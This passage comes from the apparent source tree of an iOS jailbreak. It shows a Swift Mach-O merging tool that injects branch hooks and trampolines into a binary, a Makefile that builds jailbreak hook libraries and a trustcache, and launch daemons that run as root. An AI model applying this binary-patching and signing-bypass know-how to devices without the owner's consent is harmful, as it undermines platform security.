        print("No LC_SEGMENT_SPLIT_INFO in A!")
        exit(-1)
    }
    
    guard let splitInfoB = infoB.splitInfo else {
        print("No LC_SEGMENT_SPLIT_INFO in A!")
        exit(-1)
    }
    
    let readerA = ULEB128Reader(data: splitInfoA)
    let readerB = ULEB128Reader(data: splitInfoB)
    
    processSplitInfo(readerA, relocInfo: relocInfo, isB: false)
    processSplitInfo(readerB, relocInfo: relocInfo, isB: true)
}

```

`BaseBin/MachOMerger/Sources/MachOMerger/Symbols.swift`:

```swift
//
//  Symbols.swift
//  MachOMerger
//
//  Created by Linus Henze on 2023-03-16.
//

import Foundation
import MachO

func extractSymbols(info: MachOMergeData) -> ([nlist_64]) {
    let syms = info.symtab?.symbols
    return (syms?.withUnsafeBytes({ ptr in
        [nlist_64](ptr.assumingMemoryBound(to: nlist_64.self))
    }))!
}

func fixup(symbols: [nlist_64], start: Int, count: Int, strOff: Int, relocInfo: RelocInfo, isB: Bool) -> Data {
    var syms = Data()
    let end  = start + count
    for i in start..<end {
        var sym = symbols[i]
        
        // Fix it up
        sym.n_un.n_strx += UInt32(strOff)
        sym.n_value = relocInfo.translate(address: sym.n_value, isB: isB)
        syms.appendGeneric(value: sym)
    }
    
    return syms
}

func emitSymtabDysymtab(infoA: MachOMergeData, infoB: MachOMergeData, relocInfo: RelocInfo, linkedit: inout Data, linkeditStart: Int) -> (Int, Data) {
    let symsA = extractSymbols(info: infoA)
    let symsB = extractSymbols(info: infoB)
    
    let dsymA = infoA.dysymtab!
    let dsymB = infoB.dysymtab!
    guard dsymA.localCount + dsymA.externalCount + dsymA.undefCount == symsA.count else {
        print("DSYMTAB is wrong! [A]")
        exit(-1)
    }
    
    guard dsymB.localCount + dsymB.externalCount + dsymB.undefCount == symsB.count else {
        print("DSYMTAB is wrong! [B]")
        exit(-1)
    }
    
    // Generate the new one
    var syms = Data()
    syms += fixup(symbols: symsA, start: dsymA.localStart, count: dsymA.localCount, strOff: 0, relocInfo: relocInfo, isB: false)
    syms += fixup(symbols: symsB, start: dsymB.localStart, count: dsymB.localCount, strOff: infoA.symtab!.strings.count, relocInfo: relocInfo, isB: true)
    
    let eSymsOff = syms.count / MemoryLayout<nlist_64>.size
    syms += fixup(symbols: symsA, start: dsymA.externalStart, count: dsymA.externalCount, strOff: 0, relocInfo: relocInfo, isB: false)
    syms += fixup(symbols: symsB, start: dsymB.externalStart, count: dsymB.externalCount, strOff: infoA.symtab!.strings.count, relocInfo: relocInfo, isB: true)
    
    let uSymsOff = syms.count / MemoryLayout<nlist_64>.size
    syms += fixup(symbols: symsA, start: dsymA.undefStart, count: dsymA.undefCount, strOff: 0, relocInfo: relocInfo, isB: false)
    syms += fixup(symbols: symsB, start: dsymB.undefStart, count: dsymB.undefCount, strOff: infoA.symtab!.strings.count, relocInfo: relocInfo, isB: true)
    
    let symtabOff = linkeditStart + linkedit.count
    linkedit += syms
    
    let strtabOff = linkeditStart + linkedit.count
    linkedit += infoA.symtab!.strings + infoB.symtab!.strings
    
    var symtab = symtab_command()
    symtab.cmd = UInt32(LC_SYMTAB)
    symtab.cmdsize = UInt32(MemoryLayout<symtab_command>.size)
    symtab.symoff = UInt32(symtabOff)
    symtab.nsyms = UInt32(symsA.count + symsB.count)
    symtab.stroff = UInt32(strtabOff)
    symtab.strsize = UInt32(infoA.symtab!.strings.count + infoB.symtab!.strings.count)
    
    var dysym = dysymtab_command()
    dysym.cmd = UInt32(LC_DYSYMTAB)
    dysym.cmdsize = UInt32(MemoryLayout<dysymtab_command>.size)
    dysym.ilocalsym = 0
    dysym.nlocalsym = UInt32(dsymA.localCount + dsymB.localCount)
    dysym.iextdefsym = UInt32(eSymsOff)
    dysym.nextdefsym = UInt32(dsymA.externalCount + dsymB.externalCount)
    dysym.iundefsym = UInt32(uSymsOff)
    dysym.nundefsym = UInt32(dsymA.undefCount + dsymB.undefCount)
    
    return (2, Data(fromObject: symtab) + Data(fromObject: dysym))
}

```

`BaseBin/MachOMerger/Sources/MachOMerger/ULEB128Reader.swift`:

```swift
//
//  ULEB128Reader.swift
//  MachOMerger
//
//  Created by Linus Henze on 2023-03-15.
//

import Foundation

class ULEB128Reader {
    private let data: Data
    private var pos: Int = 0
    
    init(data: Data) {
        self.data = data
    }
    
    func read() -> UInt64 {
        var result: UInt64 = 0
        var shift = 0
        while true {
            let dec = data[pos]
            pos += 1
            
            let tmp = UInt64(dec & 0x7F)
            let val = tmp << shift
            if (val >> shift) != tmp {
                // Overflow
                print("ULEB128Reader: Overflow")
                exit(-1)
            }
            
            shift += 7
            
            result |= val
            
            if (dec >> 7) == 0 {
                return result
            }
        }
    }
}

```

`BaseBin/MachOMerger/Sources/MachOMerger/UnixThread.swift`:

```swift
//
//  UnixThread.swift
//  MachOMerger
//
//  Created by Linus Henze on 2023-03-16.
//

import Foundation
import MachO

func emitUnixthread(info: MachOMergeData, relocInfo: RelocInfo, isB: Bool) -> (Int, Data) {
    let ths = info.unixthread!
    guard ths.count == 1 else {
        print("More than one UnixThread?!")
        exit(-1)
    }
    
    let th = ths[0]
    guard th.flavor == ARM_THREAD_STATE64 && th.state.count == MemoryLayout<arm_thread_state64_t>.size else {
        print("Can only support ARM64 threads!")
        exit(-1)
    }
    
    var thA64 = th.state.getGeneric(type: arm_thread_state64_t.self)
    
    thA64.__pc = relocInfo.translate(address: thA64.__pc, isB: isB)
    if let st = try? b.getSymbolTable() {
        if let newStart = st.symbol(forName: "_MACHOMERGER_START_HOOK") {
            thA64.__pc = relocInfo.translate(address: newStart.value, isB: true)
        }
    }
    
    var result = Data()
    result.appendGeneric(value: UInt32(LC_UNIXTHREAD))
    result.appendGeneric(value: UInt32(16 + MemoryLayout<arm_thread_state64_t>.size))
    result.appendGeneric(value: UInt32(ARM_THREAD_STATE64))
    result.appendGeneric(value: UInt32(MemoryLayout<arm_thread_state64_t>.size / 4))
    result.appendGeneric(value: thA64)
    
    return (1, result)
}

```

`BaseBin/MachOMerger/Sources/MachOMerger/main.swift`:

```swift
//
//  main.swift
//  MachOMerger
//
//  Created by Linus Henze.
//

import Foundation
import SwiftMachO
import MachO

typealias SegRelocInfo = [(String, [(isB: Bool, origCommand: Segment64LoadCommand, data: Data, offset: UInt64)])]

let pageSize: UInt64    = 0x4000
let pageMaskOff: UInt64 = pageSize - 1
let pageMask: UInt64    = ~pageMaskOff

guard CommandLine.arguments.count == 4 else {
    print("Usage: MachOMerger <a> <b> <out>")
    exit(-1)
}

let a = try MachO(fromFile: CommandLine.arguments[1], okToLoadFAT: false)
let b = try MachO(fromFile: CommandLine.arguments[2], okToLoadFAT: false)

var newMachO = Data()

struct MachOMergeData {
    var segments: [(Segment64LoadCommand, Data)] = []
    var linkedit: Data?
    var dylibs: [String] = []
    var chainedFixups: Data?
    var unixthread: [(flavor: UInt32, state: Data)]?
    var exportsTrie: Data?
    var symtab: (symbols: Data, strings: Data)?
    var dysymtab: (localStart: Int, localCount: Int, externalStart: Int, externalCount: Int, undefStart: Int, undefCount: Int, indirect: Data)?
    var splitInfo: Data?
    var functionStarts: Data?
    var dataInCode: Data?
    var otherCommands: [LoadCommand] = []
}

func collectData(fromMachO machO: MachO) -> MachOMergeData {
    // Iterate over all load commands
    var result = MachOMergeData()
    for cmd in machO.cmds {
        if let seg = cmd as? Segment64LoadCommand {
            let start = Int(seg.fileOffset)
            let end   = start + Int(seg.fileSize)
            guard let data = machO.data.trySubdata(in: start..<end) else {
                print("Failed to get segment \(seg.name) of a!")
                exit(-1)
            }
            
            if seg.name == "__LINKEDIT" {
                result.linkedit = data
            } else {
                result.segments.append((seg, data))
            }
        }
    }
    
    func extract(_ data: Data, _ off: Int, _ size: Int) -> Data {
        if size == 0 {
            return Data()
        }
        
        guard let res = data.trySubdata(in: off..<(off + size)) else {
            print("extract: Failed to get data!")
            exit(-1)
        }
        
        return res
    }
    
    func machOExtract(_ off: Int, _ size: Int) -> Data {
        extract(machO.data, off, size)
    }
    
    func getLECmdData(_ cmd: LoadCommand, name: String) -> Data {
        guard let cmdRaw = cmd as? OpaqueLoadCommand else {
            print("XXX: Not compatible with this version of SwiftMachO!")
            exit(-1)
        }
        
        guard let off = cmdRaw.data.tryGetGeneric(type: UInt32.self, offset: 0) else {
            print("\(name): Couldn't get offset!")
            exit(-1)
        }
        
        guard let size = cmdRaw.data.tryGetGeneric(type: UInt32.self, offset: 4) else {
            print("\(name): Couldn't get size!")
            exit(-1)
        }
        
        return machOExtract(Int(off), Int(size))
    }
    
    for cmd in machO.cmds {
        let cmdNum = cmd.type.rawValue
        if cmdNum == LC_SEGMENT_64 {
            // Already parsed
        } else if let chainLC = cmd as? ChainedFixupsLoadCommand {
            result.chainedFixups = machOExtract(Int(chainLC.fixupOffset), Int(chainLC.fixupSize))
        } else if cmdNum == LC_DYLD_EXPORTS_TRIE {
            result.exportsTrie = getLECmdData(cmd, name: "LC_DYLD_EXPORTS_TRIE")
        } else if let symtab = cmd as? SymTabLoadCommand {
            let dataSym = machOExtract(Int(symtab.symOff), 16 * Int(symtab.symCount))
            let dataStr = machOExtract(Int(symtab.strOff), Int(symtab.strSize))
            
            result.symtab = (symbols: dataSym, strings: dataStr)
        } else if cmd is DSymTabLoadCommand {
            // Will be handled later
        } else if let unixthread = cmd as? UnixThreadLoadCommand {
            result.unixthread = unixthread.threadStates
        } else if cmdNum == LC_SEGMENT_SPLIT_INFO {
            result.splitInfo = getLECmdData(cmd, name: "LC_SEGMENT_SPLIT_INFO")
        } else if cmdNum == LC_FUNCTION_STARTS {
            result.functionStarts = getLECmdData(cmd, name: "LC_FUNCTION_STARTS")
        } else if cmdNum == LC_DATA_IN_CODE {
            result.dataInCode = getLECmdData(cmd, name: "LC_DATA_IN_CODE")
        } else if cmdNum == LC_LOAD_DYLIB {
            // Handle this
        } else if cmdNum == LC_ID_DYLIB || cmdNum == LC_UUID || cmdNum == LC_ID_DYLINKER || cmdNum == LC_BUILD_VERSION || cmdNum == LC_SOURCE_VERSION {
            result.otherCommands.append(cmd)
        } else if cmdNum == LC_CODE_SIGNATURE || cmdNum == LC_ENCRYPTION_INFO_64 {
        } else {
            print("Unhandled command \(cmd.type)")
            exit(-1)
        }
    }
    
    for cmd in machO.cmds {
        if let dysym = cmd as? DSymTabLoadCommand {
            guard result.symtab != nil else {
                print("DYSYMTAB without SYMTAB!")
                exit(-1)
            }
            
            let `indirect` = machOExtract(Int(dysym.indirectOff), 4 * Int(dysym.indirectCount))
            
            guard dysym.tocCount == 0 else {
                print("DYSYMTAB: TOC not supported!")
                exit(-1)
            }
            
            guard dysym.moduleTblCount == 0 else {
                print("DYSYMTAB: Module Tables not supported!")
                exit(-1)
            }
            
            guard dysym.extSymTblCount == 0 else {
                print("DYSYMTAB: External symbol tables not supported!")
                exit(-1)
            }
            
            guard dysym.extRelCount == 0 else {
                print("DYSYMTAB: External relocation not supported!")
                exit(-1)
            }
            
            guard dysym.localRelCount == 0 else {
                print("DYSYMTAB: Local relocation not supported!")
                exit(-1)
            }
            
            result.dysymtab = (localStart: Int(dysym.localSymOff), localCount: Int(dysym.localSymCount), externalStart: Int(dysym.externalSymOff), externalCount: Int(dysym.externalSymCount), undefStart: Int(dysym.undefSymOff), undefCount: Int(dysym.undefSymCount), indirect: `indirect`)
            
            break
        }
    }
    
    return result
}

// Collect data from both MachOs
var dataA = collectData(fromMachO: a)
var dataB = collectData(fromMachO: b)

// Patch out magic of both MachOs
// Fixes issues with some third party software (e.g. Frida) finding the wrong place and mistaking it for the header
// Of course the root issue is in third party software, but I guess we can make their life easier
let magicReplacement = UInt32(0xd0d0d0d0)

/*
 * Now comes the real magic: Merging the MachOs.
 * To do this, the following steps have to be performed:
 * 1. Merge all the segments and generate appropriate reloc information
 *    Relocation information will simply be section -> offset
 */

// Segments with the same name will be merged
// We will output segments in the following order: r-x r-- rw-

var segments: [(String, [(isB: Bool, origCommand: Segment64LoadCommand, data: Data, offset: UInt64)])] = []
for seg in dataA.segments {
    guard !segments.contains(where: { $0.0 == seg.0.name }) else {
        print("Found duplicate segment! [A]")
        exit(-1)
    }

    var data = seg.1

    if seg.0.name == "__TEXT" {
        data = Data(fromObject:magicReplacement) + data.subdata(in: 4..<data.count)
    }
    
    segments.append((seg.0.name, [(isB: false, origCommand: seg.0, data: data, offset: 0)]))
}

var sortingRequired = false

for seg in dataB.segments {
    var data = seg.1

    if seg.0.name == "__TEXT" {
        data = Data(fromObject:magicReplacement) + data.subdata(in: 4..<data.count)
    }

    let newEntry = [(isB: true, origCommand: seg.0, data: data, offset: 0 as UInt64)]
    
    var found = false
    var new: [(String, [(isB: Bool, origCommand: Segment64LoadCommand, data: Data, offset: UInt64)])] = []
    for s in segments {
        if s.0 == seg.0.name {
            new.append((s.0, s.1 + newEntry))
            found = true
        } else {
            new.append(s)
        }
    }
    
    if !found {
        new.append((seg.0.name, newEntry))
        sortingRequired = true
    }
    
    segments = new
}

func compareProt(_ a: VMProt, b: VMProt) -> Bool? {
    if a.rawValue == b.rawValue {
        return nil
    } else if a.rawValue == (VM_PROT_READ | VM_PROT_EXECUTE) {
        return true
    } else if a.rawValue == VM_PROT_READ && b.rawValue == (VM_PROT_READ | VM_PROT_WRITE) {
        return true
    }
    
    return false
}

guard !sortingRequired else {
    print("FIXME: sortingRequired not implemented!")
    exit(-1)
}

// Relocate segments
var curReloc: UInt64 = 0x4000 // Reserve some space for our new header
var nSegments: [(String, [(isB: Bool, origCommand: Segment64LoadCommand, data: Data, offset: UInt64)])] = []
for var seg in segments {
    let origVM = seg.1[0].origCommand.vmAddr
    seg.1[0].offset = curReloc &- origVM
    
    curReloc += seg.1[0].origCommand.vmSize
    curReloc = (curReloc + pageMaskOff) & pageMask
    
    if seg.1.count == 2 {
        let origVM = seg.1[1].origCommand.vmAddr
        seg.1[1].offset = curReloc &- origVM
        
        curReloc += seg.1[1].origCommand.vmSize
        curReloc = (curReloc + pageMaskOff) & pageMask
    }
    
    nSegments.append(seg)
}

let relocInfo = RelocInfo(segRel: nSegments)

// Okay, we've relocated the segments
// Now we'll need to fix them
fixupViaSplitInfo(infoA: dataA, infoB: dataB, relocInfo: relocInfo)

// The segments themselfes are fixed now
// What's left is essentially chained fixups and a few others
let newChainedFixups = mergeChainedFixups(infoA: dataA, infoB: dataB, relocInfo: relocInfo, machOA: a, machOB: b)

// Generate trampolines
if let symsB = try? b.getSymbolTable(),
   let symsA = try? a.getSymbolTable() {
    for sym in symsB.symbols {
        if sym.name.starts(with: "_MACHOMERGER_TRAMPOLINE_") {
            let dstName = sym.name.replacingOccurrences(of: "_MACHOMERGER_TRAMPOLINE", with: "")
            
            var dstAddr: UInt64!
            if let d = getMagicSymbolVal(dstName) {
                dstAddr = d.0
            } else if let d = symsA.symbol(forName: dstName) {
                dstAddr = d.value
            }
            
            guard dstAddr != nil else {
                print("Cannot resolve symbol \(dstName)")
                exit(-1)
            }
            
            // Generate instruction
            let at = relocInfo.translate(address: sym.value, isB: true)
            let to = relocInfo.translate(address: dstAddr, isB: false)
            
            let delta = Int64(bitPattern: to &- at)
            let deltaSh = delta >> 2
            guard deltaSh <= 0x3FFFFFF && deltaSh >= -0x3FFFFFF else {
                print("Cannot generate trampoline: Delta too large!")
                exit(-1)
            }
            
            let instr = 0x14000000 | UInt32(deltaSh & 0x03FFFFFF)
            
            // Write it
            let seg = relocInfo.segment(forOrigAddress: sym.value, isB: true)!
            let off = Int(seg.3)
            var data = seg.1
            data = data.subdata(in: 0..<off) + Data(fromObject: instr) + data.subdata(in: (off + 4)..<data.count)
            relocInfo.replaceSegment(name: seg.0, isB: true, data: data)
        } else if sym.name.starts(with: "_MACHOMERGER_HOOKTRAMPOLINE_") {
            let dstName = sym.name.replacingOccurrences(of: "_MACHOMERGER_HOOKTRAMPOLINE", with: "")
            
            var dstAddr: UInt64!
            if let d = getMagicSymbolVal(dstName) {
                dstAddr = d.0
            } else if let d = symsA.symbol(forName: dstName) {
                dstAddr = d.value
            }
            
            guard dstAddr != nil else {
                print("Cannot resolve symbol \(dstName)")
                exit(-1)
            }
            
            // Generate instruction
            let at = relocInfo.translate(address: sym.value, isB: true)
            let to = relocInfo.translate(address: dstAddr, isB: false) + 4
            
            let delta = Int64(bitPattern: to &- at)
            let deltaSh = delta >> 2
            guard deltaSh <= 0x3FFFFFF && deltaSh >= -0x3FFFFFF else {
                print("Cannot generate trampoline: Delta too large!")
                exit(-1)
            }
            
            let instr = 0x14000000 | UInt32(deltaSh & 0x03FFFFFF)
            
            // Write it
            let seg = relocInfo.segment(forOrigAddress: sym.value, isB: true)!
            let off = Int(seg.3)
            var data = seg.1
            data = data.subdata(in: 0..<off) + Data(fromObject: instr) + data.subdata(in: (off + 4)..<data.count)
            relocInfo.replaceSegment(name: seg.0, isB: true, data: data)
        } else if sym.name.starts(with: "_MACHOMERGER_HOOK_") {
            let dstName = sym.name.replacingOccurrences(of: "_MACHOMERGER_HOOK", with: "")
            let origName = "_MACHOMERGER_ORIG" + dstName
            
            var dstAddr: UInt64!
            if let d = getMagicSymbolVal(dstName) {
                dstAddr = d.0
            } else if let d = symsA.symbol(forName: dstName) {
                dstAddr = d.value
            }

            var origAddr: UInt64!
            if let o = symsB.symbol(forName: origName) {
                origAddr = o.value
            }
            
            guard dstAddr != nil else {
                print("Cannot resolve symbol \(dstName)")
                exit(-1)
            }
            
            // Generate instruction
            let to = relocInfo.translate(address: sym.value, isB: true)
            let at = relocInfo.translate(address: dstAddr, isB: false)
            
            let delta = Int64(bitPattern: to &- at)
            let deltaSh = delta >> 2
            guard deltaSh <= 0x3FFFFFF && deltaSh >= -0x3FFFFFF else {
                print("Cannot generate trampoline: Delta too large!")
                exit(-1)
            }
            
            let instr = 0x14000000 | UInt32(deltaSh & 0x03FFFFFF)
            
            // Write it
            let seg = relocInfo.segment(forOrigAddress: dstAddr, isB: false)!
            let off = Int(seg.3)
            var data = seg.1
            let origInsn = data.subdata(in: off..<off+4).withUnsafeBytes { $0.load(as: UInt32.self) }
            data = data.subdata(in: 0..<off) + Data(fromObject: instr) + data.subdata(in: (off + 4)..<data.count)
            relocInfo.replaceSegment(name: seg.0, isB: false, data: data)

            if origAddr != nil {
                // Copy original first instruction to _MACHOMERGER_ORIG_* first instruction
                // Obviously this mechanism does not work if said instruction is pc-relative, so we have to just assume it's not
                let origSeg = relocInfo.segment(forOrigAddress: origAddr, isB: true)!
                let origOff = Int(origSeg.3)
                var origData = origSeg.1

                origData = origData.subdata(in: 0..<origOff) + Data(fromObject: origInsn) + origData.subdata(in: (origOff + 4)..<origData.count)
                relocInfo.replaceSegment(name: origSeg.0, isB: true, data: origData)
            }
        }
    }
}

// Generate most of the MachO content, except header
var machOData = Data()

for seg in relocInfo.segRel {
    machOData += seg.1[0].data
    
    if seg.1.count == 2 {
        machOData += seg.1[1].data
    }
}

// Generate the MachO itself
var machOHdr = Data()
var loadCommandsSLC = Data()
var loadCommands = Data()
var loadCommandsCount = 0

// Generate segment load commands
let (slcCount, slcs) = generateSegmentLoadCommands(infoA: dataA, infoB: dataB, relocInfo: relocInfo)
loadCommandsSLC.append(slcs)
loadCommandsCount += slcCount

var linkedit = Data()
func emitLinkeditCommand(type: UInt32, data: Data) {
    var res = Data(fromObject: type)
    res.appendGeneric(value: 0x10 as UInt32)
    res.appendGeneric(value: UInt32(linkedit.count + machOData.count + 0x4000))
    res.appendGeneric(value: UInt32(data.count))
    loadCommands.append(res)
    loadCommandsCount += 1
    
    linkedit.append(data)
}

emitLinkeditCommand(type: LC_DYLD_CHAINED_FIXUPS, data: newChainedFixups)

let (symCmdCount, symCmdData) = emitSymtabDysymtab(infoA: dataA, infoB: dataB, relocInfo: relocInfo, linkedit: &linkedit, linkeditStart: machOData.count + 0x4000)
loadCommandsCount += symCmdCount
loadCommands += symCmdData

if dataA.unixthread != nil {
    let (count, cmd) = emitUnixthread(info: dataA, relocInfo: relocInfo, isB: false)
    loadCommandsCount += count
    loadCommands += cmd
} else if dataB.unixthread != nil {
    let (count, cmd) = emitUnixthread(info: dataB, relocInfo: relocInfo, isB: true)
    loadCommandsCount += count
    loadCommands += cmd
}

for other in dataA.otherCommands {
    if let opaque = other as? OpaqueLoadCommand {
        let cmd = opaque.type.rawValue
        loadCommands += Data(fromObject: cmd) + Data(fromObject: UInt32(opaque.data.count) + 8) + opaque.data
        loadCommandsCount += 1
    }
    else if let uuidCmd = other as? UUIDLoadCommand {
        let cmd = uuidCmd.type.rawValue
        loadCommands += Data(fromObject: cmd) + Data(fromObject: uuidCmd.cmdSize) + Data(fromObject: uuidCmd.uuid)
        loadCommandsCount += 1
    }
}

let lastSegments = relocInfo.segRel.last!
let lastSegment = (lastSegments.1.count == 1) ? lastSegments.1[0] : lastSegments.1[1]
var linkeditLC = segment_command_64()
linkeditLC.cmd = UInt32(LC_SEGMENT_64)
linkeditLC.cmdsize = UInt32(MemoryLayout<segment_command_64>.size)
_ = withUnsafeMutableBytes(of: &linkeditLC.segname) { ptr in
    strcpy(ptr.baseAddress!, "__LINKEDIT")
}
linkeditLC.vmaddr = lastSegment.origCommand.vmAddr + lastSegment.offset + lastSegment.origCommand.vmSize
linkeditLC.vmsize = UInt64(linkedit.count)
linkeditLC.fileoff = lastSegment.origCommand.fileOffset + lastSegment.offset + lastSegment.origCommand.fileSize
linkeditLC.filesize = UInt64(linkedit.count)
linkeditLC.maxprot = VM_PROT_READ
linkeditLC.initprot = VM_PROT_READ
linkeditLC.nsects = 0
linkeditLC.flags = 0
loadCommandsSLC.appendGeneric(value: linkeditLC)
loadCommandsCount += 1

var hdr = mach_header_64()
hdr.magic = MH_MAGIC_64
hdr.cputype = CPU_TYPE_ARM64
hdr.cpusubtype = Int32(bitPattern: a.cpuSubType)
hdr.filetype = UInt32(MH_DYLINKER)
hdr.ncmds = UInt32(loadCommandsCount)
hdr.sizeofcmds = UInt32(loadCommands.count + loadCommandsSLC.count)

machOHdr.appendGeneric(value: hdr)
machOHdr.append(loadCommandsSLC)
machOHdr.append(loadCommands)

guard machOHdr.count < 0x4000 else {
    print("Generated MachO header too large!")
    exit(-1)
}

machOHdr.append(Data(repeating: 0, count: 0x4000 - machOHdr.count))

var out = machOHdr + machOData + linkedit

try out.write(to: URL(fileURLWithPath: CommandLine.arguments[3]))

/*let resMachO = try MachO(out)

let testCF = try resMachO.getChainedFixups()
try testCF.forEachFixup { location, vAddr, content in
    print("\(pStr(location)) -> \(pStr(vAddr))")
}*/

print("Done!")

```

`BaseBin/MachOMerger/upload.sh`:

```sh
set -e

PROJECT_NAME=MachOMerger
DEVICE=iPhoneXs.iOS15

make
ssh $DEVICE "rm -rf /var/jb/$PROJECT_NAME"
scp ./$PROJECT_NAME $DEVICE:/var/jb/$PROJECT_NAME
```

`BaseBin/Makefile`:

```
#all: mktemp choma

#mktemp:
#	rm -rf .build-dir
#	mkdir .build-dir

#choma:
#	$(MAKE) -C ChOma TARGET=ios DISABLE_SIGNING=1 DYLIB_LDFLAGS="-install_name @loader_path/libchoma.dylib" $@

all: basebin.tar

subprojects: ChOma XPF MachOMerger opainject libjailbreak systemhook forkfix launchdhook boomerang jbctl idownloadd watchdoghook rootlesshooks

ChOma: .build .include
	@$(MAKE) -C ChOma TARGET=ios DISABLE_SIGNING=1 DISABLE_TESTS=1 DYLIB_LDFLAGS="-install_name @loader_path/libchoma.dylib"
	@cp ChOma/output/ios/lib/libchoma.dylib .build
	@cp -r ChOma/output/ios/include/choma .include

XPF: .build .include ChOma
	@$(MAKE) -C XPF output/ios/libxpf.dylib CHOMA_PATH=../ChOma CHOMA_DYLIB_PATH="../.build"
	@cp XPF/output/ios/libxpf.dylib .build/libxpf.dylib
	@mkdir -p .include/xpf
	@cp XPF/src/xpf.h .include/xpf

MachOMerger: .build .include
	@$(MAKE) -C MachOMerger
	@cp MachOMerger/MachOMerger .build

opainject: .build .include
	$(MAKE) -C opainject FINALPACKAGE=1
	@cp opainject/.theos/obj/opainject .build

libjailbreak: .build .include ChOma
	$(MAKE) -C libjailbreak
	@cp libjailbreak/libjailbreak.dylib .build
	@mkdir -p .include/libjailbreak
	@cp libjailbreak/src/*.h .include/libjailbreak

systemhook: .build .include libjailbreak
	$(MAKE) -C systemhook
	@cp systemhook/systemhook.dylib .build

forkfix: .build .include libjailbreak systemhook
	$(MAKE) -C forkfix
	@cp forkfix/forkfix.dylib .build

launchdhook: .build .include libjailbreak
	$(MAKE) -C launchdhook
	@cp launchdhook/launchdhook.dylib .build

boomerang: .build .include libjailbreak
	$(MAKE) -C boomerang
	@cp boomerang/boomerang .build

jbctl: .build .include libjailbreak
	$(MAKE) -C jbctl
	@cp jbctl/jbctl .build

idownloadd: .build .include libjailbreak
	$(MAKE) -C idownloadd
	@cp idownloadd/idownloadd .build

watchdoghook: .build .include libjailbreak
	$(MAKE) -C watchdoghook
	@cp watchdoghook/watchdoghook.dylib .build

rootlesshooks: .build .include libjailbreak
	$(MAKE) -C rootlesshooks
	@cp rootlesshooks/.theos/obj/rootlesshooks.dylib .build

.build:
	rm -rf .build
	mkdir -p .build
	cp -r _external/basebin/* .build
	cp _external/basebin/.version .build

.include:
	rm -rf .include
	mkdir -p .include
	cp -r _external/include/* .include
# If the SDK already ships XPC (it does so in iOS 17.4+), remove the local copy of it
ifneq (,$(wildcard $(shell xcrun --sdk iphoneos --show-sdk-path)/usr/include/xpc.modulemap))
	rm -rf .include/xpc
endif

basebin.tc: subprojects
	trustcache create .build/basebin.tc .build
	cp .build/basebin.tc basebin.tc

# dyldhook dylibs do not need to be added to the basebin trustcache
dyldhook: basebin.tc
	$(MAKE) -C dyldhook
	@cp dyldhook/*.dylib .build

basebin.tar: basebin.tc dyldhook
	@find ./.build -name ".DS_Store" -delete
	@DYLD_FALLBACK_LIBRARY_PATH="." ./tar --transform "s/^.build/basebin/" -cvf "basebin.tar" ".build" --owner=0 --group=0

clean:
	@$(MAKE) -C ChOma $@
	@$(MAKE) -C XPF $@
	@$(MAKE) -C MachOMerger $@
	@$(MAKE) -C opainject $@
	@$(MAKE) -C libjailbreak $@
	@$(MAKE) -C systemhook $@
	@$(MAKE) -C forkfix $@
	@$(MAKE) -C launchdhook $@
	@$(MAKE) -C boomerang $@
	@$(MAKE) -C jbctl $@
	@$(MAKE) -C idownloadd $@
	@$(MAKE) -C watchdoghook $@
	@$(MAKE) -C rootlesshooks $@
	@$(MAKE) -C dyldhook $@
	@rm -rf .build
	@rm -rf .include
	@rm -rf basebin.tar
	@rm -rf basebin.tc

.PHONY: clean .build .include ChOma XPF MachOMerger opainject libjailbreak systemhook forkfix launchdhook boomerang jbctl idownloadd watchdoghook rootlesshooks basebin.tc dyldhook basebin.tar
```

`BaseBin/_external/basebin/LaunchDaemons/com.opa334.Dopamine.idownloadd.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.opa334.Dopamine.idownloadd</string>
	<key>ProgramArguments</key>
	<array>
		<string>@JBROOT@/basebin/idownloadd</string>
	</array>
	<key>UserName</key>
	<string>root</string>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
	<key>Disabled</key>
	<true/>
</dict>
</plist>

```

`BaseBin/_external/basebin/LaunchDaemons/com.opa334.Dopamine.startup.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.opa334.Dopamine.startup</string>
	<key>ProgramArguments</key>
	<array>
		<string>@JBROOT@/basebin/jbctl</string>
		<string>internal</string>
		<string>startup</string>
	</array>
	<key>UserName</key>
	<string>root</string>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<false/>
	<key>ProcessType</key>
	<string>Interactive</string>
</dict>
</plist>

```

`BaseBin/_external/frameworks/IOMobileFramebuffer.framework/IOMobileFramebuffer.tbd`:

```tbd
--- !tapi-tbd-v3
archs:                 [ armv7, armv7s, arm64, arm64e ]
platform:              ios
flags:                 [ flat_namespace ]
install-name:          /System/Library/PrivateFrameworks/IOMobileFramebuffer.framework/IOMobileFramebuffer
current-version:       1
compatibility-version: 1
exports:
  - archs:                [ armv7, armv7s, arm64, arm64e ]
    symbols:              [ _IOMFBGainEncoderCreate, _IOMFBGainEncoderDestroy,
                            _IOMFBGainEncoderEmitEmptyRows,
                            _IOMFBGainEncoderEmitRun,
                            _IOMFBGainEncoderFinishEncoding,
                            _IOMFBGainEncoderStartRow, _IOMFBGainMapRelease,
                            _IOMFBGainMapRetain, _IOMFBgainencoder_count,
                            _IOMFBgainencoder_emit_empty_rows,
                            _IOMFBgainencoder_emit_run, _IOMFBgainencoder_finish,
                            _IOMFBgainencoder_free, _IOMFBgainencoder_get_origin,
                            _IOMFBgainencoder_get_size, _IOMFBgainencoder_map,
                            _IOMFBgainencoder_map_size, _IOMFBgainencoder_new,
                            _IOMFBgainencoder_row_1_coded,
                            _IOMFBgainencoder_set_origin,
                            _IOMFBgainencoder_start_row,
                            _IOMobileFrameBufferEnableDebugTracing,
                            _IOMobileFrameBufferEnableVBLTraces,
                            _IOMobileFrameBufferGetDebugTraces,
                            _IOMobileFrameBufferGetMirroringCapability,
                            _IOMobileFrameBufferPrintDebugTraces,
                            _IOMobileFrameBufferSetLogLevel,
                            _IOMobileFrameBufferSwapSetContrastEnhancerStrength,
                            _IOMobileFrameBufferSwapSetUserLuminanceAdjustment,
                            _IOMobileFrameBufferprintDisplayRegs,
                            _IOMobileFramebufferChangeFrameInfo,
